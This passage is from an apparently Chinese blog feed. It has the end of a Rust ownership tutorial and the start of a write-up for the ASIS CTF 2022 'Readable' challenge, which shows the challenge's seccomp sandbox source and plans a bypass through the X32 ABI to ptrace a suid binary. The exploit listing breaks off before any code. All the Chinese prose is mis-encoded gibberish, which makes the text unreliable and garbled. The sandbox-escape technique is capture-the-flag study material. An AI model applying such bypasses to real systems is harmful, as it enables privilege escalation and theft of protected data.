ã€‚</p><p>é¦–å…ˆæŠŠ <code>s = String::from(&quot;goodbye&quot;);</code> åˆ äº†ï¼Œæˆ‘ä»¬å‘ç°ä»£ç å¯ä»¥æ­£ç¡®è¿è¡Œè€Œä¸”è¾“å‡ºäº† <code>HELLO</code>ã€‚è¯´æ˜è¿™ç§å¥—å¨ƒå¼•ç”¨æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: variable does not need to be mutable<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">2</span>:<span class="hljs-number">9</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>  |         ----^<br>  |         |<br>  |         help: remove this `<span class="hljs-keyword">mut</span>`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(unused_mut)]</span>` on by default<br><br>warning: `ownership` (bin <span class="hljs-string">&quot;ownership&quot;</span>) generated <span class="hljs-number">1</span> warning<br>    Finished dev [unoptimized + debuginfo] <span class="hljs-title function_ invoke__">target</span>(s) <span class="hljs-keyword">in</span> <span class="hljs-number">0.36</span>s<br>     Running `target/debug/ownership`<br>HELLO<br></code></pre></td></tr></table></figure><p>é‚£é—®é¢˜åº”è¯¥å‡ºåœ¨ï¼š ref1 ç­‰å·²ç» borrow äº† sï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹ s è¿›è¡Œä¿®æ”¹ä¼šå¯¼è‡´ s çš„é‡æ–°åˆ†é…ï¼Œå¯¼è‡´ ref1 ç­‰å¼•ç”¨æŒ‡å‘ä¸åˆæ³•çš„åŒºåŸŸã€‚</p><p>ä¸‹é¢çš„ä»£ç å¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;<span class="hljs-keyword">mut</span> s;<br>    *ref1 = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œä¸‹é¢çš„ä»£ç å°±ä¼šæŠ¥é”™ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;<span class="hljs-keyword">mut</span> s;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref2</span> = &amp;ref1;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref3</span> = &amp;ref2;<br>    *ref1 = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, ref3.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Example 2:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">drip_drop</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello world!&quot;</span>);<br>    <span class="hljs-keyword">return</span> &amp;s;<br>&#125;<br></code></pre></td></tr></table></figure><p>s åœ¨å‡½æ•°ç»“æŸæ—¶ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè¯•å›¾è¿”å›ä¸€ä¸ªæ‚¬å‚æŒ‡é’ˆåœ¨ Rust é‡Œé¢æ˜¾ç„¶æ˜¯ä¸èƒ½é€šè¿‡ç¼–è¯‘çš„ã€‚</p></li><li><p>Example 3:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(s1);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: <span class="hljs-type">String</span> = v[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s2);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust">error[E0507]: cannot <span class="hljs-keyword">move</span> out of index of `<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">5</span>:<span class="hljs-number">22</span><br>  |<br><span class="hljs-number">5</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: <span class="hljs-type">String</span> = v[<span class="hljs-number">0</span>];<br>  |                      ^^^^<br>  |                      |<br>  |                      <span class="hljs-keyword">move</span> occurs because value has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br>  |                      help: consider borrowing here: `&amp;v[<span class="hljs-number">0</span>]`<br><br>For more information about this error, <span class="hljs-keyword">try</span> `rustc --explain E0507`.<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç é¦–å…ˆ s1 çš„æ‰€æœ‰æƒè¢«ä¼ ç»™äº† Vec v ï¼Œç„¶åè¯•å›¾ä» v ä¸­å–å‡º s1 æ—¶å‘ç”Ÿäº†æŠ¥é”™ï¼Œåº”è¯¥æ˜¯ä» v å–å‡ºæ—¶åšäº† Copy çš„æ“ä½œï¼Œè€Œ String ç±»å‹æ²¡æœ‰å®ç° Copy traitï¼Œåšå¦‚ä¸‹ä¿®æ”¹å¯å®Œæˆæºä»£ç åŠŸèƒ½ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(s1);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: &amp;<span class="hljs-type">String</span> = &amp;v[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s2);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ASIS CTF Quals 2022 Readable</title>
    <link href="/posts/66d9c745.html"/>
    <url>/posts/66d9c745.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>æºç å’Œæ–‡æ¡£æ‰æ˜¯çœŸ ğŸ‘´ğŸ»ï¼Œå…¶ä»–çš„éƒ½æ˜¯å‡æ»´ï¼Œå†°çº¢èŒ¶æ»´æ°´</p></blockquote><h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2><p>æœ€è¿‘å’Œ <a href="https://strawhat.team/">Strawhat</a> çš„å¸ˆå‚…ä»¬æ‰“äº† <code>ASIS 2022 Quals</code>ï¼Œé¢˜ç›®éƒ½æŒºä¸é”™çš„ã€‚</p><p>å…¶ä¸­æœ‰ä¿©é“æ˜¯ <code>scanf()</code> çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ <code>%0s</code> å®ç°æ ˆæº¢å‡ºå’Œåˆ©ç”¨ <code>%9$s</code> å®ç°æ ˆä¸Šä»»æ„è¯»å…¥ã€‚å¬èµ·æ¥è›®ç¦»è°±ï¼Œä½†æ˜¯ç±»æ¯” <code>printf()</code> ä¸€æƒ³è¿˜æ˜¯æŒºæ­£å¸¸çš„ 233ï¼ŒæŠ¢äº†ä¸ªä¸€è¡€ã€‚å†å°±æ˜¯æ¯”èµ›ä¸­èŠ±äº†è¾ƒå¤šæ—¶é—´åœ¨ä¸‹é¢è¿™é“ <code>readable</code> ä¸Šï¼Œæµ…æµ…è®°å½•ä¸€ä¸‹åšé¢˜çš„è¿‡ç¨‹ã€‚é¡ºå¸¦å¤ç°ä¸€ä¸‹æ²¡è§£å‡ºçš„ jsyã€‚</p><p>æŠŠé¢˜ç›®æ”¾åœ¨äº†<a href="https://drive.google.com/file/d/1fbELLJohPDD4giarKeKmQcvDnLpcAiDV/view?usp=sharing">è¿™é‡Œ</a>ï¼Œéœ€è¦çš„å¸ˆå‚…ä»¬å¯ä»¥ä¸‹è½½ XDã€‚</p><h2 id="Readable-10-solves"><a class="header-anchor" href="#Readable-10-solves">Â¶</a>Readable(10 solves)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016010034466.png" alt="image-20221016010034466"></p><p>readable</p><p>Yes, you can read <strong><code>suid</code></strong> executable with <strong><code>strace</code></strong>. but what if you donâ€™t have that?</p><p>Hint: <strong><a href="https://clubby789.me/zer0pts2022/#readflag">a might-be useful blogpost</a></strong>.</p><h3 id="çœæµ"><a class="header-anchor" href="#çœæµ">Â¶</a>çœæµ</h3><p><strong>Quesion:</strong> åœ¨ seccomp é™åˆ¶å’Œä¸€äº›å…¶ä»–çš„é™åˆ¶ä¸‹ï¼Œå»è·å¾—æƒé™ä¸º <code>111(x)</code>  å¸¦æœ‰ suid æƒé™çš„ readme ç¨‹åºä¸­çš„åŸæœ¬çš„ flagã€‚</p><p><strong>Answer:</strong> åˆ©ç”¨ <code>X32 ABI</code> ç»•è¿‡æˆ–è€… <code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code> æŠŠ SUID ğŸ‘ æ¨‚ ã€‚</p><h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº†ä¿©ä¸ªæºç æ–‡ä»¶ï¼š</p><ul><li><h4 id="readme-c"><a class="header-anchor" href="#readme-c">Â¶</a><strong>readme.c</strong></h4></li></ul><p>ç”¨æ¥è¾“å‡º flagï¼Œä½†æ˜¯æ¯æ¬¡ä¼šæŠŠ flag ğŸ‘ æˆå…¶ä»–çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *flag = <span class="hljs-string">&quot;ASIS&#123;test-flag&#125;&quot;</span>; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>flag = <span class="hljs-string">&quot;No flag for you&quot;</span>;<br><span class="hljs-built_in">puts</span>(flag);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="run-c"><a class="header-anchor" href="#run-c">Â¶</a><strong>run.c</strong></h4></li></ul><p>è®¾ç½®äº† seccompï¼ˆğŸ‘ æ‰äº† ptrace ç­‰ğŸ‘¨ğŸ»æ‰“ğŸ‘¦ğŸ»çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼ŒğŸ‘ æ‰äº† <code>/proc</code>ï¼Œæ›´æ”¹äº† uid å’Œ gid ä¸º <code>1000(pwn)</code>ï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„ expã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_nr (offsetof(struct seccomp_data, nr))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> arch_nr (offsetof(struct seccomp_data, arch))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARCH_NR AUDIT_ARCH_X86_64</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VALIDATE_ARCHITECTURE                             \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),            \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXAMINE_SYSCALL BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DISALLOW_SYSCALL(name)                            \</span><br><span class="hljs-meta">  BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOW_SYSCALLS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">install_filter</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      VALIDATE_ARCHITECTURE,<br>      EXAMINE_SYSCALL,<br>      DISALLOW_SYSCALL(ptrace),<br>      DISALLOW_SYSCALL(process_vm_readv),<br>      DISALLOW_SYSCALL(process_vm_writev),<br>      ALLOW_SYSCALLS,<br>  &#125;;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>)(<span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>])),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="hljs-number">2</span>, &amp;prog)) &#123;<br>    perror(<span class="hljs-string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">char</span> **)</span> &#123;<br>  install_filter();<br>  <span class="hljs-keyword">if</span> (umount(<span class="hljs-string">&quot;/proc&quot;</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not umount procfs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (setgid(<span class="hljs-number">1000</span>) || setuid(<span class="hljs-number">1000</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not drop privs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-type">char</span> *args = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/tmp/exploit&quot;</span>,&amp;args,&amp;args);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/Untitled-1665855700180-4.png" alt="Untitled"></p><ul><li><strong>Dockerfile</strong></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/readme /home/pwn/readme</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/run /home/pwn/run</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root /home/pwn/*   </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /home/pwn/run; </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 111 /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> u+s /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd pwn;</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/home/pwn/run&quot;</span>];</span><br></code></pre></td></tr></table></figure><h3 id="æ€è€ƒ"><a class="header-anchor" href="#æ€è€ƒ">Â¶</a>æ€è€ƒ</h3><p>é¢˜ç›®æœ¬èº«è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œç»™äº† RCE çš„æœºä¼šï¼Œæƒ³åŠæ³•å»æ‹¿åˆ° flagã€‚</p><p>é¢˜ç›®æœ¬èº« Hint ç»™çš„é˜…è¯»ææ–™å…¶å®å¾ˆæœ‰ä»·å€¼ï¼Œé€šè¿‡é˜…è¯»æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä¸€ä¸‹çš„å‡ ä¸ªæ–¹æ³•ï¼š</p><ul><li>åˆ©ç”¨ /proc ç›®å½•ç›´æ¥è¯»ï¼ˆæœ¬é¢˜æ‰§è¡Œäº† <code>umount(&quot;/proc&quot;)</code>ï¼ŒğŸ”ï¼‰</li><li>åˆ©ç”¨ <code>LD_PROLOAD</code> ç­‰ç¯å¢ƒå˜é‡ï¼Œhook æ‰å…³é”®å‡½æ•°ï¼ˆä½†æ˜¯ SUID ç¨‹åºä¸€èˆ¬ä¸èµ°è¿™äº›å˜é‡ï¼‰</li><li>åˆ©ç”¨ Ptrace ç³»ç»Ÿè°ƒç”¨ï¼Œå³ä½¿æ²¡æœ‰è¯»å†™æƒé™ï¼Œä¹Ÿèƒ½ hook æ‰å­è¿›ç¨‹æ‰§è¡Œæ—¶çš„ syscallï¼ˆä½†æ˜¯ Ptrace å¥½åƒè¢« ban äº†ï¼‰</li></ul><h3 id="Exp1-X32-ABI"><a class="header-anchor" href="#Exp1-X32-ABI">Â¶</a>Exp1(X32 ABI)</h3><p>å…ˆèŠèŠæ¯”èµ›çš„æ—¶å€™æˆ‘çš„æƒ³æ³•ï¼šç”±äºæˆ‘ç»™æ–°ç”Ÿèµ›å‡ºé¢˜å¡äº†ä¸ªç±»ä¼¼çš„ Seccomp çš„ç¼˜æ•…ğŸ˜ˆï¼Œç¬¬ä¸€çœ¼å°±çœ‹åˆ° Seccomp æ²¡æœ‰å¯¹ <code>X32 ABI</code> çš„æ£€æµ‹ï¼Œé‚£ä¹ˆ Ptrace ban äº†ç­‰äºæ²¡ ban XDï¼ŒåŠ«æŒæ‰å­è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å°± ok ğŸ˜ã€‚ï¼ˆè¿™ä¸æ˜¯ç™½ç»™å—.jpgï¼‰</p><p>ä½†å¾ˆå‚»çš„æ˜¯ï¼Œåœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¥ä¸º <code>X32 ABI</code> çš„è°ƒç”¨å·å°±æ˜¯ <code>0x4000000 + SYS_number</code> è¿™ç§ï¼Œå¯¹ç€ <code>0x40000000 + SYS_ptrace</code> å‘ç”µäº†å¥½ä¹…ï¼Œæœ€åå·®ç‚¹ä»¥ä¸ºè¿™æ¡è·¯èµ°ä¸é€šã€‚</p><p>åæ¥é€šè¿‡é˜…è¯»èµ„æ–™ï¼Œå‘ç°å…¶å®çœŸæ­£çš„ç³»ç»Ÿè°ƒç”¨å·ä¿å­˜åœ¨ <code>/usr/include/x86_64-linux-gnu/asm/unistd_x32.h</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å‚è€ƒ<a href="https://clubby789.me/zer0pts2022/#readflag">åŸåšæ–‡</a>ï¼Œå¾ˆå®¹æ˜“çš„å°±å¯ä»¥å†™å‡ºä»¥ä¸‹åˆ©ç”¨ Expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 